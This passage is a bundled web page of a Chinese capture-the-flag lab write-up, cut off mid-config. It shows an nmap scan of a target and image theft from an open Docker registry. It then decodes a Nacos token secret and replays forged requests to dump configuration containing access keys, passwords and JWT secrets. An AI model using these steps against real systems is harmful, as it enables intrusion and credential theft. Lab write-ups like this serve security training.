"use strict";(self.webpackChunktarget_machines_write_up=self.webpackChunktarget_machines_write_up||[]).push([[8163],{41797:(n,e,s)=>{s.r(e),s.d(e,{assets:()=>l,contentTitle:()=>o,default:()=>p,frontMatter:()=>r,metadata:()=>c,toc:()=>i});var t=s(85893),a=s(11151);const r={},o="\u7b2c\u4e5d\u7ae0 - blueteam \u7684\u5c0f\u5fc3\u601d 2",c={id:"Xuanji/Unit-9/43",title:"\u7b2c\u4e5d\u7ae0 - blueteam \u7684\u5c0f\u5fc3\u601d 2",description:"1",source:"@site/docs/Xuanji/Unit-9/43.md",sourceDirName:"Xuanji/Unit-9",slug:"/Xuanji/Unit-9/43",permalink:"/Target-Machines-WriteUp/docs/Xuanji/Unit-9/43",draft:!1,unlisted:!1,editUrl:"https://github.com/TryHackMyOffsecBox/Target-Machines-WriteUp/edit/main/docs/Xuanji/Unit-9/43.md",tags:[],version:"current",frontMatter:{},sidebar:"Xuanji_Sidebar",previous:{title:"\u7b2c\u4e5d\u7ae0 - blueteam \u7684\u5c0f\u5fc3\u601d",permalink:"/Target-Machines-WriteUp/docs/Xuanji/Unit-9/40"},next:{title:"\u7b2c\u4e5d\u7ae0 - Where-1S-tHe-Hacker",permalink:"/Target-Machines-WriteUp/docs/Xuanji/Unit-9/63"}},l={},i=[{value:"1",id:"1",level:2},{value:"\u626b\u63cf\u9776\u673a\u7684\u5f00\u653e\u7aef\u53e3",id:"\u626b\u63cf\u9776\u673a\u7684\u5f00\u653e\u7aef\u53e3",level:3},{value:"\u83b7\u53d6 nacos \u955c\u50cf\u6570\u636e",id:"\u83b7\u53d6-nacos-\u955c\u50cf\u6570\u636e",level:3},{value:"2",id:"2",level:2},{value:"3",id:"3",level:2},{value:"4",id:"4",level:2},{value:"5",id:"5",level:2}];function d(n){const e={admonition:"admonition",blockquote:"blockquote",code:"code",h1:"h1",h2:"h2",h3:"h3",header:"header",img:"img",p:"p",pre:"pre",...(0,a.a)(),...n.components};return(0,t.jsxs)(t.Fragment,{children:[(0,t.jsx)(e.header,{children:(0,t.jsx)(e.h1,{id:"\u7b2c\u4e5d\u7ae0---blueteam-\u7684\u5c0f\u5fc3\u601d-2",children:"\u7b2c\u4e5d\u7ae0 - blueteam \u7684\u5c0f\u5fc3\u601d 2"})}),"\n",(0,t.jsx)(e.h2,{id:"1",children:"1"}),"\n",(0,t.jsxs)(e.blockquote,{children:["\n",(0,t.jsx)(e.p,{children:"nacos \u7684 key \u4e3a\u591a\u5c11 flag{base64decodekey}"}),"\n"]}),"\n",(0,t.jsx)(e.p,{children:"\u8fd9\u4e2a\u73af\u5883\u5e76\u4e0d\u662f\u5e38\u89c4\u7684\u4e0a\u673a\u8fdb\u884c\u5e94\u6025\u7684\u9898\u76ee\uff0c\u8fd9\u91cc\u9700\u8981\u5148\u5bf9\u9776\u673a\u8fdb\u884c\u6e17\u900f\u653b\u51fb"}),"\n",(0,t.jsx)(e.h3,{id:"\u626b\u63cf\u9776\u673a\u7684\u5f00\u653e\u7aef\u53e3",children:"\u626b\u63cf\u9776\u673a\u7684\u5f00\u653e\u7aef\u53e3"}),"\n",(0,t.jsxs)(e.admonition,{type:"info",children:[(0,t.jsx)(e.p,{children:"\u9700\u8981\u6ce8\u610f\uff0c\u73af\u5883\u542f\u52a8\u9700\u8981\u4e00\u5b9a\u65f6\u95f4\uff0c\u8bf7\u7a0d\u7b49 3 \u5206\u949f\u5de6\u53f3\u518d\u5f00\u59cb\u626b\u63cf\u64cd\u4f5c"}),(0,t.jsx)(e.p,{children:"\u540c\u65f6\uff0c\u5efa\u8bae\u4f7f\u7528\u4e91\u670d\u52a1\u5668\u8fdb\u884c\u626b\u63cf\uff0c\u6821\u56ed\u7f51\u548c\u6d41\u91cf\u70ed\u70b9\u90fd\u6709\u51fa\u73b0\u4e0d\u540c\u60c5\u51b5\u7684\u5e72\u6270"})]}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-plaintext",metastring:'title="nmap"',children:'Nmap scan report for ec2-52-82-27-37.cn-northwest-1.compute.amazonaws.com.cn (52.82.27.37)\nHost is up, received echo-reply ttl 43 (0.053s latency).\nScanned at 2024-05-26 16:18:35 CST for 65s\nNot shown: 65520 closed ports\nReason: 65520 resets\nPORT     STATE    SERVICE          REASON         VERSION\n80/tcp   filtered http             no-response\n135/tcp  filtered msrpc            no-response\n136/tcp  filtered profile          no-response\n137/tcp  filtered netbios-ns       no-response\n138/tcp  filtered netbios-dgm      no-response\n139/tcp  filtered netbios-ssn      no-response\n443/tcp  filtered https            no-response\n445/tcp  filtered microsoft-ds     no-response\n593/tcp  filtered http-rpc-epmap   no-response\n2222/tcp open     ssh              syn-ack ttl 42 OpenSSH 7.9p1 Debian 10+deb10u3 (protocol 2.0)\n| ssh-hostkey:\n|   2048 39:26:71:4c:4f:48:c1:4c:75:f5:2b:6e:1e:5f:a1:0d (RSA)\n| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDScdsKvBjbOe7CjYm9G72Ew8uoxRv5tW1GnMJ9xBhddn61r7Q9EAhKl9a09tqfkc9PMHLrbg4sUFplCadSBATDcvTsazozoYto7NVuNoJD12R5O5VgoVDzzk29bID0gWoYcsGKuZjJ9BOJ/CDMHExkHq38wfisrUbAaPS27UM3e1DOKuGMDzi18BKsj1ZCOuqDio9jUjhh3xKxuWqPLkc12DLq4oSVOGMZOX85xj261BWoqgOwVTBmDt0FC+z0fiJlZYLs3xboqxWpIjUN70kDwJjOz1Oen/UX5mldViig4fcj337OQsOZhAfMez7BqtEOY7BcCI+lU9r5eg4zNuNv\n|   256 9b:38:86:a7:6c:e2:5b:43:0b:19:ae:05:71:54:7a:16 (ECDSA)\n| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOmA2ukt6Jc8jLKDMZBNDcZnQBRsO+wQaiOUuyeQELgZNjpz4WuDSjw3mI6yNpwzySl5jt7sZ1A5muuSCNb6K0I=\n|   256 3b:42:08:0a:93:83:c1:97:08:50:d8:28:59:e4:27:23 (ED25519)\n|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIARiXHVhbRW2QY2h2UMG6ZJBsz8DmScnvoRpeqH79epF\n4444/tcp filtered krb524           no-response\n5000/tcp open     http             syn-ack ttl 41 Docker Registry (API: 2.0)\n| http-methods:\n|_  Supported Methods: GET HEAD POST OPTIONS\n|_http-title: Site doesn\'t have a title.\n8080/tcp filtered http-proxy       no-response\n8082/tcp open     blackice-alerts? syn-ack ttl 41\n| fingerprint-strings:\n|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, Kerberos, RPCCheck, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie:\n|     HTTP/1.1 400\n|     Date: Sun, 26 May 2024 08:19:00 GMT\n|     Connection: close\n|   FourOhFourRequest:\n|     HTTP/1.1 404\n|     Content-Type: application/json;charset=UTF-8\n|     Date: Sun, 26 May 2024 08:18:55 GMT\n|     Connection: close\n|     {"timestamp":"2024/05/26 16:18:55","status":404,"error":"Not Found","message":"No message available","path":"/nice%20ports%2C/Tri%6Eity.txt%2ebak"}\n|   GetRequest:\n|     HTTP/1.1 302\n|     Set-Cookie: JSESSIONID=B7F3E564B8918E2D2C135099568E6B6F; Path=/; HttpOnly\n|     Location: http://localhost:8082/login.html\n|     Content-Length: 0\n|     Date: Sun, 26 May 2024 08:18:55 GMT\n|     Connection: close\n|   HTTPOptions:\n|     HTTP/1.1 200\n|     Allow: GET,HEAD,POST,PUT,PATCH,DELETE,OPTIONS\n|     Content-Length: 0\n|     Date: Sun, 26 May 2024 08:19:00 GMT\n|_    Connection: close\n8848/tcp open     unknown          syn-ack ttl 40\n| fingerprint-strings:\n|   GetRequest, HTTPOptions:\n|     HTTP/1.1 404\n|     Content-Type: text/html;charset=utf-8\n|     Content-Language: en\n|     Content-Length: 431\n|     Date: Sun, 26 May 2024 08:19:00 GMT\n|     Connection: close\n|     <!doctype html><html lang="en"><head><title>HTTP Status 404\n|     Found</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 404\n|     Found</h1></body></html>\n|   RTSPRequest:\n|     HTTP/1.1 400\n|     Content-Type: text/html;charset=utf-8\n|     Content-Language: en\n|     Content-Length: 435\n|     Date: Sun, 26 May 2024 08:19:00 GMT\n|     Connection: close\n|     <!doctype html><html lang="en"><head><title>HTTP Status 400\n|     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400\n|_    Request</h1></body></html>\n'})}),"\n",(0,t.jsx)(e.h3,{id:"\u83b7\u53d6-nacos-\u955c\u50cf\u6570\u636e",children:"\u83b7\u53d6 nacos \u955c\u50cf\u6570\u636e"}),"\n",(0,t.jsx)(e.p,{children:"\u5728\u5176\u4e2d\u53d1\u73b0\u6709 Docker Registry \u670d\u52a1\uff0c\u5c1d\u8bd5\u8fdb\u884c\u8bbf\u95ee"}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-json",metastring:'title="http://52.82.27.37:5000/v2/_catalog"',children:'{\n    "repositories": [\n        "nacos"\n    ]\n}\n'})}),"\n",(0,t.jsxs)(e.p,{children:["\u53d1\u73b0\u5b58\u5728\u6709 ",(0,t.jsx)(e.code,{children:"nacos"})," \u955c\u50cf\uff0c\u67e5\u770b\u955c\u50cf\u7684 tags"]}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-json",metastring:'title="http://52.82.27.37:5000/v2/nacos/tags/list"',children:'{\n    "name": "nacos",\n    "tags": [\n        "latest"\n    ]\n}\n'})}),"\n",(0,t.jsx)(e.p,{children:"\u5c1d\u8bd5\u5c06\u955c\u50cf\u83b7\u53d6\u5230\u672c\u5730\uff0c\u9996\u5148\u9700\u8981\u6539\u5199\u672c\u5730 docekr \u7684\u5b89\u5168\u7b56\u7565\uff0c\u5141\u8bb8 http \u4e0d\u5b89\u5168\u7684\u6ce8\u518c\u8868"}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-json",metastring:'title="/etc/docker/daemon.json"',children:'{\n    "insecure-registries" : ["52.82.27.37:5000"]\n}\n'})}),"\n",(0,t.jsx)(e.p,{children:"\u7136\u540e\u91cd\u542f dockerd"}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-shell",children:"sudo systemctl daemon-reload\nsudo systemctl restart docker\n"})}),"\n",(0,t.jsx)(e.p,{children:"\u4e0b\u8f7d\u955c\u50cf"}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-shell",children:"randark@developer:~/temp$ docker pull 52.82.27.37:5000/nacos:latest\nlatest: Pulling from nacos\n2d473b07cdd5: Pull complete\n8e2e6bf0e569: Pull complete\nc7276c1c2105: Pull complete\n2694550f92f1: Pull complete\nb043b5656d6f: Pull complete\n103731dfc453: Pull complete\ne1dec0556439: Pull complete\n4f4fb700ef54: Pull complete\n48ba5d7d5cad: Pull complete\nDigest: sha256:42ea3485ea154fbbc6b6bd26f497f046b1355e888fc1792d87a143644945dfb8\nStatus: Downloaded newer image for 52.82.27.37:5000/nacos:latest\n52.82.27.37:5000/nacos:latest\n"})}),"\n",(0,t.jsx)(e.p,{children:"\u7136\u540e\u57fa\u4e8e\u6b64\u955c\u50cf\u542f\u52a8\u4e00\u4e2a\u5bb9\u5668"}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-shell",children:"randark@developer:~/temp$ docker run -d 52.82.27.37:5000/nacos\n85bc4f99c050386699c96560d65fd8150d88b4989d75158d8d23cc0b9e0955d9\n"})}),"\n",(0,t.jsx)(e.p,{children:"\u5c06 vscode \u9644\u52a0\u8fdb\u6b64\u5bb9\u5668\uff0c\u5f00\u59cb\u5ba1\u8ba1"}),"\n",(0,t.jsx)(e.p,{children:(0,t.jsx)(e.img,{alt:"img",src:s(80937).Z+"",width:"2560",height:"1541"})}),"\n",(0,t.jsxs)(e.p,{children:["\u5728 ",(0,t.jsx)(e.code,{children:"/home/nacos"})," \u76ee\u5f55\u4e0b\u542f\u52a8 vscode \u8fdb\u884c\u5ba1\u8ba1\uff0c\u4ee5 key \u4f5c\u4e3a\u5173\u952e\u8bcd\u8fdb\u884c\u641c\u7d22\uff0c\u53ef\u4ee5\u627e\u5230\u8fd9\u6761\u8bb0\u5f55"]}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-plaintext",metastring:'title="/home/nacos/conf/application.properties"',children:"nacos.core.auth.plugin.nacos.token.secret.key=eGpuYWNvczIwMjNwZW5ndWluZWRpc2VjZmxhZ2ZsYWdmbGFn\n"})}),"\n",(0,t.jsx)(e.p,{children:"\u7ecf\u8fc7 Base64 \u89e3\u7801\u540e\u5f97\u5230"}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-plaintext",children:"eGpuYWNvczIwMjNwZW5ndWluZWRpc2VjZmxhZ2ZsYWdmbGFn\nxjnacos2023penguinedisecflagflagflag\n"})}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-flag",children:"flag{xjnacos2023penguinedisecflagflagflag}\n"})}),"\n",(0,t.jsx)(e.h2,{id:"2",children:"2"}),"\n",(0,t.jsxs)(e.blockquote,{children:["\n",(0,t.jsx)(e.p,{children:"nacos \u914d\u7f6e\u6587\u4ef6\u7684 flag"}),"\n"]}),"\n",(0,t.jsx)(e.p,{children:"\u4ece\u5f97\u5230\u7684 Docker \u955c\u50cf\u4e2d\uff0c\u53ef\u4ee5\u5f97\u5230\u4ee5\u4e0b\u4e09\u4e2a\u914d\u7f6e\u9879"}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-plaintext",children:"nacos.core.auth.server.identity.key=nacosKey\nnacos.core.auth.server.identity.value=nacosValue\nnacos.core.auth.plugin.nacos.token.secret.key=eGpuYWNvczIwMjNwZW5ndWluZWRpc2VjZmxhZ2ZsYWdmbGFn\n"})}),"\n",(0,t.jsx)(e.p,{children:"\u4f7f\u7528\u5b98\u65b9\u7248\u672c\u7684 Nacos Docker Image \u542f\u52a8\u4e00\u4e2a\u672c\u5730\u670d\u52a1"}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-shell",children:"git clone --depth 1 https://github.com/nacos-group/nacos-docker.git\ncd nacos-docker\n"})}),"\n",(0,t.jsxs)(e.p,{children:["\u7136\u540e\u7f16\u8f91 ",(0,t.jsx)(e.code,{children:"./example/standalone-derby.yaml"})," \u8fd9\u4e2a\u6587\u4ef6"]}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-yaml",children:'version: "2"\nservices:\n  nacos:\n    image: nacos/nacos-server:v2.2.3\n    container_name: nacos-standalone\n    environment:\n      - PREFER_HOST_MODE=hostname\n      - MODE=standalone\n      - NACOS_AUTH_IDENTITY_KEY=nacosKey\n      - NACOS_AUTH_IDENTITY_VALUE=nacosValue\n      - NACOS_AUTH_TOKEN=eGpuYWNvczIwMjNwZW5ndWluZWRpc2VjZmxhZ2ZsYWdmbGFn\n      - NACOS_AUTH_ENABLE=true\n    volumes:\n      - ./standalone-logs/:/home/nacos/logs\n    ports:\n      - "8848:8848"\n      - "9848:9848"\n  prometheus:\n    container_name: prometheus\n    image: prom/prometheus:latest\n    volumes:\n      - ./prometheus/prometheus-standalone.yaml:/etc/prometheus/prometheus.yml\n    ports:\n      - "9090:9090"\n    depends_on:\n      - nacos\n    restart: on-failure\n  grafana:\n    container_name: grafana\n    image: grafana/grafana:latest\n    ports:\n      - 3000:3000\n    restart: on-failure\n'})}),"\n",(0,t.jsx)(e.p,{children:"\u542f\u52a8\u672c\u5730\u670d\u52a1"}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-shell",children:"docker compose -f example/standalone-derby-xj.yaml up\n"})}),"\n",(0,t.jsxs)(e.p,{children:["\u6b63\u5e38\u8bbf\u95ee\u672c\u5730\u670d\u52a1\uff0c\u4f7f\u7528 ",(0,t.jsx)(e.code,{children:"nacos:nacos"})," \u767b\u5f55\u5e73\u53f0\uff0c\u6293\u5305\uff0c\u62ff\u5230 accesskey"]}),"\n",(0,t.jsx)(e.p,{children:(0,t.jsx)(e.img,{alt:"img",src:s(75326).Z+"",width:"2560",height:"1314"})}),"\n",(0,t.jsx)(e.p,{children:"\u6d41\u91cf\u91cd\u653e\u7ed9\u9776\u673a\uff0c\u5373\u53ef\u5f97\u5230\u4ee5\u4e0b\u914d\u7f6e\u6587\u4ef6\u4fe1\u606f"}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-json",children:'{\n  "totalCount": 3,\n  "pageNumber": 1,\n  "pagesAvailable": 1,\n  "pageItems": [\n    {\n      "id": "710744516197363712",\n      "dataId": "GATEWAY",\n      "group": "DEFAULT_GROUP",\n      "content": "spring:\\r\\n  cloud:\\r\\n    gateway:\\r\\n      routes:\\r\\n        - id: index\\r\\n          uri: lb://product-server\\r\\n          predicates:\\r\\n            - Method=GET",\n      "md5": null,\n      "encryptedDataKey": "",\n      "tenant": "",\n      "appName": "",\n      "type": null\n    },\n    {\n      "id": "710744516415467520",\n      "dataId": "ADMIN_CONFIG",\n      "group": "DEFAULT_GROUP",\n      "content": "\\n# \u9879\u76ee\u76f8\u5173\u914d\u7f6e \\ nadmin-api:\\n  # access_key_id \u4f60\u7684\u4e9a\u9a6c\u900a S3 \u670d\u52a1\u5668\u8bbf\u95ee\u5bc6\u94a5 ID\\n  accessKey: AAAZKIAWTRDCOOZNINALPHDWN\\n  # secret_key \u4f60\u7684\u4e9a\u9a6c\u900a S3 \u670d\u52a1\u5668\u8bbf\u95ee\u5bc6\u94a5 \\ n  secretKey: LAX2DAwi7yntlLnmOQvCYAAGITNloeZQlfLUSOzvW96s5c\\n  # bucketname \u4f60\u7684\u4e9a\u9a6c\u900a S3 \u670d\u52a1\u5668\u521b\u5efa\u7684\u6876\u540d \\ n  bucketName: kefu-test-env\\n  # bucketname \u4f60\u7684\u4e9a\u9a6c\u900a S3 \u670d\u52a1\u5668\u521b\u5efa\u7684\u6876\u540d \\ n  regionsName: ap-east-1\\n  # questionPicture \u95ee\u9898\u7c7b\u578b\u56fe\u7247\u4e0a\u4f20\u6587\u4ef6\u5939\u540d\u79f0 \\ n  questionPicture: questionFolder\\n  # chatPicture \u804a\u5929\u56fe\u7247\u4e0a\u4f20\u6587\u4ef6\u5939\u540d\u79f0 \\ n  chatPicture: chatFolder\\n  # rechargePicture \u4ee3\u5ba2\u5145\u503c\u56fe\u7247\u4e0a\u4f20\u6587\u4ef6\u5939\u540d\u79f0 \\ n  rechargePicture: rechargeFolder\\n   # \u83b7\u53d6 ip \u5730\u5740\u5f00\u5173 \\ n  addressEnabled: true\\n  # \u4e2d\u540e\u53f0\u7684\u5730\u5740 \\ n  url: http://localhost\\n  # \u4e2d\u540e\u53f0 API \u5730\u5740 \\ n  seektopserUrl: http://localhost/api/partner/user/info/base\\n  # \u4e2d\u540e\u53f0 API \u8bf7\u6c42 APPID\\n  seektopAppId: A9AA30D1D30F459VS7B83C054B3EAD770D\\n  # \u4e2d\u540e\u53f0 API \u8bf7\u6c42\u5bc6\u94a5 \\ n  seektopSecretKey: yT2BivSJLCR4lHb8SzhNFmHSF12pBm+a4IfdF42/a1quQdu5wqznM7YA==\\n  # \u5ba2\u670d\u5173\u95ed\u4f1a\u8bdd\u914d\u7f6e\u65f6\u95f4 \\ n  closeChannelTime: 3\\n   # redis-task \u670d\u52a1\u8bf7\u6c42\u5730\u5740 \\ n  redisTaskUrl: http://localhost:8586 \\n  \\nim:\\n  server:\\n    url: https://localhost:9507\\n    secret: ^look^\\n\\n\\nserver:\\n  port: 8500\\n  servlet:\\n    context-path: /api\\n\\n# \u914d\u7f6e\u6570\u636e\u6e90 \\ nspring:\\n  datasource:\\n    druid:\\n      url: jdbc:log4jdbc:mysql://127.0.0.1:3306/admin?serverTimezone=Asia/Shanghai&characterEncoding=utf8&useSSL=false\\n      username: root\\n      password: root\\n\\n  main:\\n    allow-bean-definition-overriding: true\\n\\n  jpa:\\n    hibernate:\\n      # \u751f\u4ea7\u73af\u5883\u8bbe\u7f6e\u6210 none\uff0c\u907f\u514d\u7a0b\u5e8f\u8fd0\u884c\u65f6\u81ea\u52a8\u66f4\u65b0\u6570\u636e\u5e93\u7ed3\u6784 \\ n      ddl-auto: none\\n\\n\\nelasticsearch:\\n    nodes: es.localhost:9200\\n\\n# \u591a\u6570\u636e\u6e90\u914d\u7f6e \\ ngt:\\n  root:\\n    boot:\\n      #\u4e3b\u52a8\u5f00\u542f\u591a\u6570\u636e\u6e90 \\ n      multiDatasourceOpen: true\\n      datasource[0]:\\n        dbName: slave\\n        url: jdbc:log4jdbc:mysql://127.0.0.1:3306/admin?serverTimezone=Asia/Shanghai&characterEncoding=utf8&useSSL=false\\n        username: root\\n        password: root\\n\\n#jwt\\njwt:\\n  header: Authorization\\n  # \u4ee4\u724c\u524d\u7f00 \\ n  token-start-with: Bearer\\n  # \u5fc5\u987b\u4f7f\u7528\u6700\u5c11 88 \u4f4d\u7684 Base64 \u5bf9\u8be5\u4ee4\u724c\u8fdb\u884c\u7f16\u7801 \\ n  base64-secret: ZmQ0ZGI5NjQ0MDQwY2I4MjMxY2Y3ZmI3MjdhN2ZmMjNhODViOTg1ZGE0NTBjMGM4NDA5NzYxMjdjOWMwYWRmZTBlZjlhNGY3ZTg4Y2U3YTE1ODVkZDU5Y2Y3OGYwZWE1NzUzNWQ2YjFjZDc0NGMxZWU2MmQ3MjY1NzJmNTE0MzI=\\n  # \u4ee4\u724c\u8fc7\u671f\u65f6\u95f4 \u6b64\u5904\u5355\u4f4d / \u6beb\u79d2 \uff0c\u9ed8\u8ba4 4 \u5c0f\u65f6\uff0c\u53ef\u5728\u6b64\u7f51\u7ad9\u751f\u6210 https://www.convertworld.com/zh-hans/time/milliseconds.html\\n  token-validity-in-seconds: 14400000\\n  # \u5728\u7ebf\u7528\u6237 key\\n  online-key: online-token\\n  # \u9a8c\u8bc1\u7801 \\ n  code-key: code-key\\n\\n# \u662f\u5426\u5141\u8bb8\u751f\u6210\u4ee3\u7801\uff0c\u751f\u4ea7\u73af\u5883\u8bbe\u7f6e\u4e3a false\\ngenerator:\\n  enabled: false\\n\\n# \u662f\u5426\u5f00\u542f swagger-ui\\nswagger:\\n  enabled: true\\n\\n\\n# \u4e03\u725b\u4e91 \\ nqiniu:\\n  # \u6587\u4ef6\u5927\u5c0f /M\\n  max-size: 15\\n\\n# \u90ae\u7bb1\u9a8c\u8bc1\u7801\u6709\u6548\u65f6\u95f4 / \u5206\u949f \\ ncode:\\n  expiration: 5\\n\\n# \u767b\u5f55\u56fe\u5f62\u9a8c\u8bc1\u7801\u6709\u6548\u65f6\u95f4 / \u5206\u949f \\ nloginCode:\\n  expiration: 2\\n\\n# sm.ms \u56fe\u5e8a\u7684 token\\nsmms:\\n  token: 1oOP3ykFDI0K6ifmtvU7c8Y1eTWZSlyl\\n\\n# file-managerpassword\\nfile-manager:\\n  name: admin\\n  password: xj2023@1578921@123\\n  jwtkey: 123456\\n#flag{9d7ffcef-bcd1-4f4b-9a2d-d51862484168}\\ntask:\\n  pool:\\n    # \u6838\u5fc3\u7ebf\u7a0b\u6c60\u5927\u5c0f \\ n    core-pool-size: 10\\n    # \u6700\u5927\u7ebf\u7a0b\u6570 \\ n    max-pool-size: 30\\n    # \u6d3b\u8dc3\u65f6\u95f4 \\ n    keep-alive-seconds: 60\\n    # \u961f\u5217\u5bb9\u91cf \\ n    queue-capacity: 50\\n\\n# \u5c06\u8be5\u5de5\u7a0b\u5e94\u7528\u540d\u79f0\u6dfb\u52a0\u5230\u8ba1\u91cf\u5668\u6ce8\u518c\u8868\u7684 tag \u4e2d \\ n# \u5f00\u542f Actuator \u670d\u52a1 \\ nmanagement:\\n  endpoints:\\n    web:\\n      exposure:\\n        include:\'*\'\\n  metrics:\\n    tags:\\n      application: admin-api",\n      "md5": null,\n      "encryptedDataKey": "",\n      "tenant": "",\n      "appName": "",\n      "type": null\n    },\n    {\n      "id": "710744516436439040",\n      "dataId": "ADMIN_API",\n      "group": "DEFAULT_GROUP",\n      "content": "# \u9879\u76ee\u76f8\u5173\u914d\u7f6e \\ r\\nadmin-api:\\r\\n  # access_key_id \u4f60\u7684\u4e9a\u9a6c\u900a S3 \u670d\u52a1\u5668\u8bbf\u95ee\u5bc6\u94a5 ID\\r\\n  accessKey: AAKIAWTRDCOOZNINALPHDWN\\r\\n  # secret_key \u4f60\u7684\u4e9a\u9a6c\u900a S3 \u670d\u52a1\u5668\u8bbf\u95ee\u5bc6\u94a5 \\ r\\n  secretKey: 2DAwi7yntlLnmOQvCYAAGITNloeZQlfLUSOzvW96s5c\\r\\n  # bucketname \u4f60\u7684\u4e9a\u9a6c\u900a S3 \u670d\u52a1\u5668\u521b\u5efa\u7684\u6876\u540d \\ r\\n  bucketName: kefu-test-env\\r\\n  # bucketname \u4f60\u7684\u4e9a\u9a6c\u900a S3 \u670d\u52a1\u5668\u521b\u5efa\u7684\u6876\u540d \\ r\\n  regionsName: ap-east-1\\r\\n  # questionPicture \u95ee\u9898\u7c7b\u578b\u56fe\u7247\u4e0a\u4f20\u6587\u4ef6\u5939\u540d\u79f0 \\ r\\n  questionPicture: questionFolder\\r\\n  # chatPicture \u804a\u5929\u56fe\u7247\u4e0a\u4f20\u6587\u4ef6\u5939\u540d\u79f0 \\ r\\n  chatPicture: chatFolder\\r\\n   # \u83b7\u53d6 ip \u5730\u5740\u5f00\u5173 \\ r\\n  addressEnabled: true\\r\\n  # \u4e2d\u540e\u53f0\u7684\u5730\u5740 \\ r\\n  url: http://127.0.0.1\\r\\n  # \u4e2d\u540e\u53f0 API \u5730\u5740 \\ r\\n  seektopserUrl: http://127.0.0.1/api/partner/user/info/base\\r\\n  # \u4e2d\u540e\u53f0 API \u8bf7\u6c42 APPID\\r\\n  seektopAppId: A9AA30D1D30F4597B83C054B3EAD770D\\r\\n  # \u4e2d\u540e\u53f0 API \u8bf7\u6c42\u5bc6\u94a5 \\ r\\n  seektopSecretKey: yT2BivSJLCR4lHb8hNFmHSF12pBm+a4IfdF42/a1quQdu5wqznM7YA==\\r\\n  # \u5ba2\u670d\u5173\u95ed\u4f1a\u8bdd\u914d\u7f6e\u65f6\u95f4 \\ r\\n  closeChannelTime: 3\\r\\n   # redis-task \u670d\u52a1\u8bf7\u6c42\u5730\u5740 \\ r\\n  redisTaskUrl: http://localhost:8586 \\r\\n   # SEO \u4ee3\u7406\u5e33\u865f \\ r\\n  seoAgentName: \\r\\n  \\r\\nim:\\r\\n  server:\\r\\n    url: http://localhost:9507/\\r\\n    secret: ^look^\\r\\n\\r\\n\\r\\nserver:\\r\\n  port: 8500\\r\\n  servlet:\\r\\n    context-path: /api\\r\\n\\r\\n# \u914d\u7f6e\u6570\u636e\u6e90 \\ r\\nspring:\\r\\n  datasource:\\r\\n    druid:\\r\\n      url: jdbc:log4jdbc:mysql://127.0.0.1:3306/admin?serverTimezone=Asia/Shanghai&characterEncoding=utf8&useSSL=false\\r\\n      username: root\\r\\n      password: root\\r\\n\\r\\n  main:\\r\\n    allow-bean-definition-overriding: true\\r\\n\\r\\n  jpa:\\r\\n    hibernate:\\r\\n      # \u751f\u4ea7\u73af\u5883\u8bbe\u7f6e\u6210 none\uff0c\u907f\u514d\u7a0b\u5e8f\u8fd0\u884c\u65f6\u81ea\u52a8\u66f4\u65b0\u6570\u636e\u5e93\u7ed3\u6784 \\ r\\n      ddl-auto: none\\r\\n\\r\\n\\r\\nelasticsearch:\\r\\n    nodes: es.localhost:9200\\r\\n\\r\\n#jwt\\r\\njwt:\\r\\n  header: Authorization\\r\\n  # \u4ee4\u724c\u524d\u7f00 \\ r\\n  token-start-with: Bearer\\r\\n  # \u5fc5\u987b\u4f7f\u7528\u6700\u5c11 88 \u4f4d\u7684 Base64 \u5bf9\u8be5\u4ee4\u724c\u8fdb\u884c\u7f16\u7801 \\ r\\n  base64-secret: ZmQ0ZGI5NjQ0MDQwY2I4MjMxY2Y3ZmI3MjdhN2ZmMjNhODViOTg1ZGE0NTBjMGM4NDA5NzYxMjdjOWMwYWRmZTBlZjlhNGY3ZTg4Y2U3YTE1ODVkZDU5Y2Y3OGYwZWE1NzUzNWQ2YjFjZDc0NGMxZWU2MmQ3MjY1NzJmNTE0MzI=\\r\\n  # \u4ee4\u724c\u8fc7\u671f\u65f6\u95f4 \u6b64\u5904\u5355\u4f4d / \u6beb\u79d2 \uff0c\u9ed8\u8ba4 4 \u5c0f\u65f6\uff0c\u53ef\u5728\u6b64\u7f51\u7ad9\u751f\u6210 https://www.convertworld.com/zh-hans/time/milliseconds.html\\r\\n  token-validity-in-seconds: 14400000\\r\\n  # \u5728\u7ebf\u7528\u6237 key\\r\\n  online-key: online-token\\r\\n  # \u9a8c\u8bc1\u7801 \\ r\\n  code-key: code-key\\r\\n\\r\\n# 